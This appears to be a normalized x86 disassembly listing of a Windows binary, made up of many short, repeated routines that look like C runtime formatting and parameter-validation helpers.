inc [ ecx + 0x450 ]
xor eax eax
cmp [ ecx + 0x450 ] 0x2
setne al
retn
sub_41d964
xor eax eax
inc eax
retn
sub_41d968
xor eax eax
inc eax
retn
sub_41d96c
xor eax eax
inc eax
retn
sub_41d970
xor eax eax
inc eax
retn
sub_41d974
push 0x4
pop eax
retn
sub_41d978
push 0x2
pop eax
retn
sub_41d97c
push 0x2
pop eax
retn
sub_41d980
xor eax eax
inc eax
retn
sub_41d984
xor eax eax
inc eax
retn
sub_41d988
xor eax eax
inc eax
retn
sub_41d98c
xor eax eax
inc eax
retn
sub_41d990
xor eax eax
inc eax
retn
sub_41d994
push 0x4
pop eax
retn
sub_41d998
push 0x2
pop eax
retn
sub_41d99c
push 0x2
pop eax
retn
sub_41d9a0
xor eax eax
inc eax
retn
sub_41d9a4
xor eax eax
inc eax
retn
sub_41d9a8
xor eax eax
inc eax
retn
sub_41d9ac
xor eax eax
inc eax
retn
sub_41d9b0
xor eax eax
inc eax
retn
sub_41d9b4
push 0x4
pop eax
retn
sub_41d9b8
push 0x2
pop eax
retn
sub_41d9bc
push 0x2
pop eax
retn
sub_41d9c0
xor eax eax
inc eax
retn
sub_41d9c4
xor eax eax
inc eax
retn
sub_41d9c8
xor eax eax
inc eax
retn
sub_41d9cc
xor eax eax
inc eax
retn
sub_41d9d0
xor eax eax
inc eax
retn
sub_41d9d4
push 0x4
pop eax
retn
sub_41d9d8
push 0x2
pop eax
retn
sub_41d9dc
push 0x2
pop eax
retn
sub_41d9e0
xor eax eax
inc eax
retn
sub_41d9e4
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x20 ]
and eax [ ebp + 0x8 ]
neg eax
sbb eax eax
neg eax
pop ebp
retn 0x4
sub_41d9f9
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x20 ]
and eax [ ebp + 0x8 ]
neg eax
sbb eax eax
neg eax
pop ebp
retn 0x4
sub_41da0e
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x20 ]
and eax [ ebp + 0x8 ]
neg eax
sbb eax eax
neg eax
pop ebp
retn 0x4
sub_41da23
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x20 ]
and eax [ ebp + 0x8 ]
neg eax
sbb eax eax
neg eax
pop ebp
retn 0x4
sub_41da38
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x20 ]
and eax [ ebp + 0x8 ]
neg eax
sbb eax eax
neg eax
pop ebp
retn 0x4
sub_41da4d
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x20 ]
and eax [ ebp + 0x8 ]
neg eax
sbb eax eax
neg eax
pop ebp
retn 0x4
sub_41da62
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x20 ]
and eax [ ebp + 0x8 ]
neg eax
sbb eax eax
neg eax
pop ebp
retn 0x4
sub_41da77
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x20 ]
and eax [ ebp + 0x8 ]
neg eax
sbb eax eax
neg eax
pop ebp
retn 0x4
sub_41da8c
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x20 ]
and eax [ ebp + 0x8 ]
neg eax
sbb eax eax
neg eax
pop ebp
retn 0x4
sub_41daa1
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x20 ]
and eax [ ebp + 0x8 ]
neg eax
sbb eax eax
neg eax
pop ebp
retn 0x4
sub_41dab6
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x20 ]
and eax [ ebp + 0x8 ]
neg eax
sbb eax eax
neg eax
pop ebp
retn 0x4
sub_41dacb
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x20 ]
and eax [ ebp + 0x8 ]
neg eax
sbb eax eax
neg eax
pop ebp
retn 0x4
sub_41df82
mov eax r--data
retn
sub_41df88
mov eax r--data
retn
sub_41df8e
mov eax r--data
retn
sub_41df94
mov eax r--data
retn
sub_41df9a
mov eax r--data
retn
sub_41dfa0
mov eax r--data
retn
sub_41dfa6
mov eax r--data
retn
sub_41dfac
mov eax r--data
retn
sub_41dfb2
mov eax r--data
retn
sub_41dfb8
mov eax r--data
retn
sub_41dfbe
mov eax r--data
retn
sub_41dfc4
mov eax r--data
retn
sub_41f2c6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
or [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_41f2d5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
or [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_41f2e4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
or [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_41f2f3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
or [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_41f302
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
or [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_41f311
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
or [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_41f320
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
or [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_41f32f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
or [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_41f33e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
or [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_41f34d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
or [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_41f35c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
or [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_41f36b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
or [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_41f3a6
xor eax eax
inc eax
cmp [ ecx + 0x458 ] eax
jne r-xdata
retn
cmp [ ecx + 0x45c ] eax
je r-xdata
xor eax eax
sub_41f3bc
xor eax eax
inc eax
cmp [ ecx + 0x458 ] eax
jne r-xdata
retn
cmp [ ecx + 0x45c ] eax
je r-xdata
xor eax eax
sub_41f3d2
mov al 0x1
retn
sub_41f3d5
mov al 0x1
retn
sub_41f3d8
mov al 0x1
retn
sub_41f3db
mov al 0x1
retn
sub_41f47e
xor al al
retn
sub_41f481
xor al al
retn
sub_41f484
xor al al
retn
sub_41f487
xor al al
retn
sub_41f48a
cmp [ ecx + 0x45c ] 0x2
jne r-xdata
xor eax eax
xor eax eax
inc eax
cmp [ ecx + 0x458 ] eax
je r-xdata
retn
sub_41f4a1
cmp [ ecx + 0x45c ] 0x2
jne r-xdata
xor eax eax
xor eax eax
inc eax
cmp [ ecx + 0x458 ] eax
je r-xdata
retn
sub_41f4b8
cmp [ ecx + 0x45c ] 0x2
jne r-xdata
xor eax eax
xor eax eax
inc eax
cmp [ ecx + 0x458 ] eax
je r-xdata
retn
sub_41f4cf
cmp [ ecx + 0x45c ] 0x2
jne r-xdata
xor eax eax
xor eax eax
inc eax
cmp [ ecx + 0x458 ] eax
je r-xdata
retn
sub_41f4e6
xor al al
retn
sub_41f4e9
xor al al
retn
sub_41f4ec
xor al al
retn
sub_41f4ef
xor al al
retn
sub_41f4f2
and [ ecx + 0x28 ] 0x0
mov al 0x1
retn
sub_41f4f9
and [ ecx + 0x28 ] 0x0
mov al 0x1
retn
sub_41f500
and [ ecx + 0x28 ] 0x0
mov al 0x1
retn
sub_41f507
and [ ecx + 0x28 ] 0x0
mov al 0x1
retn
sub_41f50e
and [ ecx + 0x28 ] 0x0
mov al 0x1
retn
sub_41f515
and [ ecx + 0x28 ] 0x0
mov al 0x1
retn
sub_41f51c
and [ ecx + 0x28 ] 0x0
mov al 0x1
retn
sub_41f523
and [ ecx + 0x28 ] 0x0
mov al 0x1
retn
sub_41f52a
and [ ecx + 0x28 ] 0x0
mov al 0x1
retn
sub_41f531
and [ ecx + 0x28 ] 0x0
mov al 0x1
retn
sub_41f538
and [ ecx + 0x28 ] 0x0
mov al 0x1
retn
sub_41f53f
and [ ecx + 0x28 ] 0x0
mov al 0x1
retn
sub_41f822
call sub_41f9de
test al al
jne r-xdata
mov al 0x1
retn
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
sub_41f872
call sub_41fa32
test al al
jne r-xdata
mov al 0x1
retn
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
sub_41f891
call sub_41fa5c
test al al
jne r-xdata
mov al 0x1
retn
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
sub_41f8e1
call sub_41fab0
test al al
jne r-xdata
mov al 0x1
retn
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
sub_41f900
call sub_41fada
test al al
jne r-xdata
mov al 0x1
retn
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
sub_41f950
call sub_41fb10
test al al
jne r-xdata
mov al 0x1
retn
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
sub_41f96f
call sub_41fb2b
test al al
jne r-xdata
mov al 0x1
retn
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
sub_41f9bf
call sub_41fb61
test al al
jne r-xdata
mov al 0x1
retn
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
sub_41fada
lea edx [ ecx + 0x18 ]
mov [ ecx + 0x3c ] 0x1
push edx
movzx edx [ ecx + 0x32 ]
add ecx 0x448
push edx
call sub_42837c
mov al 0x1
retn
sub_41faf5
lea edx [ ecx + 0x18 ]
mov [ ecx + 0x3c ] 0x1
push edx
movzx edx [ ecx + 0x32 ]
add ecx 0x448
push edx
call sub_42837c
mov al 0x1
retn
sub_41fb10
lea edx [ ecx + 0x18 ]
mov [ ecx + 0x3c ] 0x1
push edx
movzx edx [ ecx + 0x32 ]
add ecx 0x448
push edx
call sub_42837c
mov al 0x1
retn
sub_41fb2b
lea edx [ ecx + 0x18 ]
mov [ ecx + 0x3c ] 0x1
push edx
movzx edx [ ecx + 0x32 ]
add ecx 0x448
push edx
call sub_4283fe
mov al 0x1
retn
sub_41fb46
lea edx [ ecx + 0x18 ]
mov [ ecx + 0x3c ] 0x1
push edx
movzx edx [ ecx + 0x32 ]
add ecx 0x448
push edx
call sub_4283fe
mov al 0x1
retn
sub_41fb61
lea edx [ ecx + 0x18 ]
mov [ ecx + 0x3c ] 0x1
push edx
movzx edx [ ecx + 0x32 ]
add ecx 0x448
push edx
call sub_4283fe
mov al 0x1
retn
sub_41fdc2
mov [ ecx + 0x3c ] 0x1
mov al 0x1
retn 0x4
sub_41fdcb
mov [ ecx + 0x3c ] 0x1
mov al 0x1
retn 0x4
sub_41fdd4
mov [ ecx + 0x3c ] 0x1
mov al 0x1
retn 0x4
sub_41fddd
mov [ ecx + 0x3c ] 0x1
mov al 0x1
retn 0x4
sub_41fde6
mov [ ecx + 0x3c ] 0x1
mov al 0x1
retn 0x4
sub_41fdef
mov [ ecx + 0x3c ] 0x1
mov al 0x1
retn 0x4
sub_41fdf8
or [ ecx + 0x28 ] 0xffffffff
xor eax eax
mov [ ecx + 0x24 ] eax
mov [ ecx + 0x30 ] al
mov [ ecx + 0x20 ] eax
mov [ ecx + 0x2c ] eax
mov [ ecx + 0x3c ] al
mov al 0x1
retn
sub_41fe10
or [ ecx + 0x28 ] 0xffffffff
xor eax eax
mov [ ecx + 0x24 ] eax
mov [ ecx + 0x30 ] al
mov [ ecx + 0x20 ] eax
mov [ ecx + 0x2c ] eax
mov [ ecx + 0x3c ] al
mov al 0x1
retn
sub_41fe28
or [ ecx + 0x28 ] 0xffffffff
xor eax eax
mov [ ecx + 0x24 ] eax
mov [ ecx + 0x30 ] al
mov [ ecx + 0x20 ] eax
mov [ ecx + 0x2c ] eax
mov [ ecx + 0x3c ] al
mov al 0x1
retn
sub_41fe40
or [ ecx + 0x28 ] 0xffffffff
xor eax eax
mov [ ecx + 0x24 ] eax
mov [ ecx + 0x30 ] al
mov [ ecx + 0x20 ] eax
mov [ ecx + 0x2c ] eax
mov [ ecx + 0x3c ] al
mov al 0x1
retn
sub_41fe58
or [ ecx + 0x28 ] 0xffffffff
xor eax eax
mov [ ecx + 0x24 ] eax
mov [ ecx + 0x30 ] al
mov [ ecx + 0x20 ] eax
mov [ ecx + 0x2c ] eax
mov [ ecx + 0x3c ] al
mov al 0x1
retn
sub_41fe70
or [ ecx + 0x28 ] 0xffffffff
xor eax eax
mov [ ecx + 0x24 ] eax
mov [ ecx + 0x30 ] al
mov [ ecx + 0x20 ] eax
mov [ ecx + 0x2c ] eax
mov [ ecx + 0x3c ] al
mov al 0x1
retn
sub_41fe88
or [ ecx + 0x28 ] 0xffffffff
xor eax eax
mov [ ecx + 0x24 ] eax
mov [ ecx + 0x30 ] al
mov [ ecx + 0x20 ] eax
mov [ ecx + 0x2c ] eax
mov [ ecx + 0x3c ] al
mov al 0x1
retn
sub_41fea0
or [ ecx + 0x28 ] 0xffffffff
xor eax eax
mov [ ecx + 0x24 ] eax
mov [ ecx + 0x30 ] al
mov [ ecx + 0x20 ] eax
mov [ ecx + 0x2c ] eax
mov [ ecx + 0x3c ] al
mov al 0x1
retn
sub_41feb8
or [ ecx + 0x28 ] 0xffffffff
xor eax eax
mov [ ecx + 0x24 ] eax
mov [ ecx + 0x30 ] al
mov [ ecx + 0x20 ] eax
mov [ ecx + 0x2c ] eax
mov [ ecx + 0x3c ] al
mov al 0x1
retn
sub_41fed0
or [ ecx + 0x28 ] 0xffffffff
xor eax eax
mov [ ecx + 0x24 ] eax
mov [ ecx + 0x30 ] al
mov [ ecx + 0x20 ] eax
mov [ ecx + 0x2c ] eax
mov [ ecx + 0x3c ] al
mov al 0x1
retn
sub_41fee8
or [ ecx + 0x28 ] 0xffffffff
xor eax eax
mov [ ecx + 0x24 ] eax
mov [ ecx + 0x30 ] al
mov [ ecx + 0x20 ] eax
mov [ ecx + 0x2c ] eax
mov [ ecx + 0x3c ] al
mov al 0x1
retn
sub_41ff00
or [ ecx + 0x28 ] 0xffffffff
xor eax eax
mov [ ecx + 0x24 ] eax
mov [ ecx + 0x30 ] al
mov [ ecx + 0x20 ] eax
mov [ ecx + 0x2c ] eax
mov [ ecx + 0x3c ] al
mov al 0x1
retn
sub_42307e
push 0x9
pop eax
retn
sub_423082
push 0x9
pop eax
retn
sub_423086
push 0x9
pop eax
retn
sub_42308a
push 0x9
pop eax
retn
sub_42308e
push 0x8
pop eax
retn
sub_423092
push 0x8
pop eax
retn
sub_423096
push 0x8
pop eax
retn
sub_42309a
push 0x8
pop eax
retn
sub_42309e
mov eax r--data
retn
sub_4230a4
mov eax r--data
retn
sub_4230aa
mov eax r--data
retn
sub_4230b0
mov eax r--data
retn
sub_4230b6
mov eax r--data
retn
sub_4230bc
mov eax r--data
retn
sub_4230c2
mov eax r--data
retn
sub_4230c8
mov eax r--data
retn
sub_42312a
push 0x1
push 0x10
call sub_425080
retn
sub_423134
push 0x1
push 0x10
call sub_4251ca
retn
sub_42313e
push 0x1
push 0x10
call sub_425348
retn
sub_423148
push 0x1
push 0x10
call sub_425492
retn
sub_423152
push 0x1
push 0x10
call sub_4255dc
retn
sub_42315c
push 0x1
push 0x10
call sub_42575a
retn
sub_423166
push 0x1
push 0x10
call sub_4258a4
retn
sub_423170
push 0x1
push 0x10
call sub_4259ee
retn
sub_42317a
push 0x1
push 0x10
call sub_425b6c
retn
sub_423184
push 0x1
push 0x10
call sub_425cb6
retn
sub_42318e
push 0x1
push 0x10
call sub_425e00
retn
sub_423198
push 0x1
push 0x10
call sub_425f7e
retn
sub_4247fa
push 0x0
call sub_42485a
retn
sub_424802
push 0x0
call sub_4248ea
retn
sub_42480a
push 0x0
call sub_4249aa
retn
sub_424812
push 0x0
call sub_424a3a
retn
sub_42481a
push 0x0
call sub_424aca
retn
sub_424822
push 0x0
call sub_424b8a
retn
sub_42482a
push 0x0
call sub_424c1a
retn
sub_424832
push 0x0
call sub_424cb2
retn
sub_42483a
push 0x0
call sub_424d61
retn
sub_424842
push 0x0
call sub_424df9
retn
sub_42484a
push 0x0
call sub_424e91
retn
sub_424852
push 0x0
call sub_424f40
retn
sub_424fd8
or [ ecx + 0x20 ] 0x10
push 0x0
push 0xa
call sub_425080
retn
sub_424fe6
or [ ecx + 0x20 ] 0x10
push 0x0
push 0xa
call sub_4251ca
retn
sub_424ff4
or [ ecx + 0x20 ] 0x10
push 0x0
push 0xa
call sub_425348
retn
sub_425002
or [ ecx + 0x20 ] 0x10
push 0x0
push 0xa
call sub_425492
retn
sub_425010
or [ ecx + 0x20 ] 0x10
push 0x0
push 0xa
call sub_4255dc
retn
sub_42501e
or [ ecx + 0x20 ] 0x10
push 0x0
push 0xa
call sub_42575a
retn
sub_42502c
or [ ecx + 0x20 ] 0x10
push 0x0
push 0xa
call sub_4258a4
retn
sub_42503a
or [ ecx + 0x20 ] 0x10
push 0x0
push 0xa
call sub_4259ee
retn
sub_425048
or [ ecx + 0x20 ] 0x10
push 0x0
push 0xa
call sub_425b6c
retn
sub_425056
or [ ecx + 0x20 ] 0x10
push 0x0
push 0xa
call sub_425cb6
retn
sub_425064
or [ ecx + 0x20 ] 0x10
push 0x0
push 0xa
call sub_425e00
retn
sub_425072
or [ ecx + 0x20 ] 0x10
push 0x0
push 0xa
call sub_425f7e
retn
sub_4266cc
mov edx [ ecx + 0x20 ]
mov eax edx
shr eax 0x5
test al 0x1
je r-xdata
push 0x0
push 0x8
call sub_425080
retn
or edx 0x80
mov [ ecx + 0x20 ] edx
sub_4266eb
mov edx [ ecx + 0x20 ]
mov eax edx
shr eax 0x5
test al 0x1
je r-xdata
push 0x0
push 0x8
call sub_4251ca
retn
or edx 0x80
mov [ ecx + 0x20 ] edx
sub_42670a
mov edx [ ecx + 0x20 ]
mov eax edx
shr eax 0x5
test al 0x1
je r-xdata
push 0x0
push 0x8
call sub_425348
retn
or edx 0x80
mov [ ecx + 0x20 ] edx
sub_426729
mov edx [ ecx + 0x20 ]
mov eax edx
shr eax 0x5
test al 0x1
je r-xdata
push 0x0
push 0x8
call sub_425492
retn
or edx 0x80
mov [ ecx + 0x20 ] edx
sub_426748
mov edx [ ecx + 0x20 ]
mov eax edx
shr eax 0x5
test al 0x1
je r-xdata
push 0x0
push 0x8
call sub_4255dc
retn
or edx 0x80
mov [ ecx + 0x20 ] edx
sub_426767
mov edx [ ecx + 0x20 ]
mov eax edx
shr eax 0x5
test al 0x1
je r-xdata
push 0x0
push 0x8
call sub_42575a
retn
or edx 0x80
mov [ ecx + 0x20 ] edx
sub_426786
mov edx [ ecx + 0x20 ]
mov eax edx
shr eax 0x5
test al 0x1
je r-xdata
push 0x0
push 0x8
call sub_4258a4
retn
or edx 0x80
mov [ ecx + 0x20 ] edx
sub_4267a5
mov edx [ ecx + 0x20 ]
mov eax edx
shr eax 0x5
test al 0x1
je r-xdata
push 0x0
push 0x8
call sub_4259ee
retn
or edx 0x80
mov [ ecx + 0x20 ] edx
sub_4267c4
mov edx [ ecx + 0x20 ]
mov eax edx
shr eax 0x5
test al 0x1
je r-xdata
push 0x0
push 0x8
call sub_425b6c
retn
or edx 0x80
mov [ ecx + 0x20 ] edx
sub_4267e3
mov edx [ ecx + 0x20 ]
mov eax edx
shr eax 0x5
test al 0x1
je r-xdata
push 0x0
push 0x8
call sub_425cb6
retn
or edx 0x80
mov [ ecx + 0x20 ] edx
sub_426802
mov edx [ ecx + 0x20 ]
mov eax edx
shr eax 0x5
test al 0x1
je r-xdata
push 0x0
push 0x8
call sub_425e00
retn
or edx 0x80
mov [ ecx + 0x20 ] edx
sub_426821
mov edx [ ecx + 0x20 ]
mov eax edx
shr eax 0x5
test al 0x1
je r-xdata
push 0x0
push 0x8
call sub_425f7e
retn
or edx 0x80
mov [ ecx + 0x20 ] edx
sub_426840
push 0x1
push 0x10
mov [ ecx + 0x28 ] 0x8
mov [ ecx + 0x2c ] 0xa
call sub_425080
retn
sub_426858
push 0x1
push 0x10
mov [ ecx + 0x28 ] 0x8
mov [ ecx + 0x2c ] 0xa
call sub_4251ca
retn
sub_426870
push 0x1
push 0x10
mov [ ecx + 0x28 ] 0x8
mov [ ecx + 0x2c ] 0xa
call sub_425348
retn
sub_426888
push 0x1
push 0x10
mov [ ecx + 0x28 ] 0x8
mov [ ecx + 0x2c ] 0xa
call sub_425492
retn
sub_4268a0
push 0x1
push 0x10
mov [ ecx + 0x28 ] 0x8
mov [ ecx + 0x2c ] 0xa
call sub_4255dc
retn
sub_4268b8
push 0x1
push 0x10
mov [ ecx + 0x28 ] 0x8
mov [ ecx + 0x2c ] 0xa
call sub_42575a
retn
sub_4268d0
push 0x1
push 0x10
mov [ ecx + 0x28 ] 0x8
mov [ ecx + 0x2c ] 0xa
call sub_4258a4
retn
sub_4268e8
push 0x1
push 0x10
mov [ ecx + 0x28 ] 0x8
mov [ ecx + 0x2c ] 0xa
call sub_4259ee
retn
sub_426900
push 0x1
push 0x10
mov [ ecx + 0x28 ] 0x8
mov [ ecx + 0x2c ] 0xa
call sub_425b6c
retn
sub_426918
push 0x1
push 0x10
mov [ ecx + 0x28 ] 0x8
mov [ ecx + 0x2c ] 0xa
call sub_425cb6
retn
sub_426930
push 0x1
push 0x10
mov [ ecx + 0x28 ] 0x8
mov [ ecx + 0x2c ] 0xa
call sub_425e00
retn
sub_426948
push 0x1
push 0x10
mov [ ecx + 0x28 ] 0x8
mov [ ecx + 0x2c ] 0xa
call sub_425f7e
retn
sub_426ef0
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ ecx + 0x34 ]
call sub_4348ca
pop ecx
pop ecx
pop ebp
retn 0x8
sub_426f06
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ ecx + 0x34 ]
call sub_4348ca
pop ecx
pop ecx
pop ebp
retn 0x8
sub_426f1c
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ ecx + 0x34 ]
call sub_4348ca
pop ecx
pop ecx
pop ebp
retn 0x8
sub_426f32
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ ecx + 0x34 ]
call sub_4348ca
pop ecx
pop ecx
pop ebp
retn 0x8
sub_426f48
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ ecx + 0x34 ]
call sub_4348ca
pop ecx
pop ecx
pop ebp
retn 0x8
sub_426f5e
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ ecx + 0x34 ]
call sub_4348ca
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4270f4
push 0x0
push 0xa
call sub_425080
retn
sub_4270fe
push 0x0
push 0xa
call sub_4251ca
retn
sub_427108
push 0x0
push 0xa
call sub_425348
retn
sub_427112
push 0x0
push 0xa
call sub_425492
retn
sub_42711c
push 0x0
push 0xa
call sub_4255dc
retn
sub_427126
push 0x0
push 0xa
call sub_42575a
retn
sub_427130
push 0x0
push 0xa
call sub_4258a4
retn
sub_42713a
push 0x0
push 0xa
call sub_4259ee
retn
sub_427144
push 0x0
push 0xa
call sub_425b6c
retn
sub_42714e
push 0x0
push 0xa
call sub_425cb6
retn
sub_427158
push 0x0
push 0xa
call sub_425e00
retn
sub_427162
push 0x0
push 0xa
call sub_425f7e
retn
sub_42716c
push 0x0
push 0x10
call sub_425080
retn
sub_427176
push 0x0
push 0x10
call sub_4251ca
retn
sub_427180
push 0x0
push 0x10
call sub_425348
retn
sub_42718a
push 0x0
push 0x10
call sub_425492
retn
sub_427194
push 0x0
push 0x10
call sub_4255dc
retn
sub_42719e
push 0x0
push 0x10
call sub_42575a
retn
sub_4271a8
push 0x0
push 0x10
call sub_4258a4
retn
sub_4271b2
push 0x0
push 0x10
call sub_4259ee
retn
sub_4271bc
push 0x0
push 0x10
call sub_425b6c
retn
sub_4271c6
push 0x0
push 0x10
call sub_425cb6
retn
sub_4271d0
push 0x0
push 0x10
call sub_425e00
retn
sub_4271da
push 0x0
push 0x10
call sub_425f7e
retn
sub_4271e4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
not eax
and [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_4271f5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
not eax
and [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_427206
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
not eax
and [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_427217
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
not eax
and [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_427228
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
not eax
and [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_427239
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
not eax
and [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_42724a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
not eax
and [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_42725b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
not eax
and [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_42726c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
not eax
and [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_42727d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
not eax
and [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_42728e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
not eax
and [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_42729f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
not eax
and [ ecx + 0x20 ] eax
pop ebp
retn 0x4
sub_42758a
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x24 ] eax
mov al 0x1
retn
sub_42759a
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x24 ] eax
mov al 0x1
retn
sub_4275aa
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x24 ] eax
mov al 0x1
retn
sub_4275ba
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x24 ] eax
mov al 0x1
retn
sub_4278a4
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x28 ] eax
mov al 0x1
retn
sub_4278b4
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x28 ] eax
mov al 0x1
retn
sub_4278c4
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x28 ] eax
mov al 0x1
retn
sub_4278d4
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x28 ] eax
mov al 0x1
retn
sub_4278e4
mov eax [ ecx ]
test eax eax
jne r-xdata
push eax
call sub_428272
pop ecx
retn
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
sub_427905
cmp [ ecx ] 0x0
jne r-xdata
mov al 0x1
retn
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
sub_427920
cmp [ ecx ] 0x0
jne r-xdata
mov al 0x1
retn
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
sub_42793b
cmp [ ecx ] 0x0
jne r-xdata
mov al 0x1
retn
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
sub_427e7a
mov al 0x1
retn
sub_427e7d
mov al 0x1
retn
sub_427e80
mov al 0x1
retn
sub_427e83
mov al 0x1
retn
sub_427e86
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ ecx + 0x1c ] 0x7
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
sub_427ea8
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ ecx + 0x1c ] 0x7
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
sub_427eca
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ ecx + 0x1c ] 0x7
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
sub_427eec
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ ecx + 0x1c ] 0x7
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
sub_42810e
mov al 0x1
retn
sub_428111
mov al 0x1
retn
sub_428114
mov al 0x1
retn
sub_428117
mov al 0x1
retn
sub_428266
mov al 0x1
retn
sub_428269
mov al 0x1
retn
sub_42826c
mov al 0x1
retn
sub_42826f
mov al 0x1
retn
sub_4282f4
mov al 0x1
retn
sub_4282f7
mov eax r--data
retn
sub_4282fd
mov eax r--data
retn
sub_428303
mov eax r--data
retn
sub_428309
mov eax r--data
retn
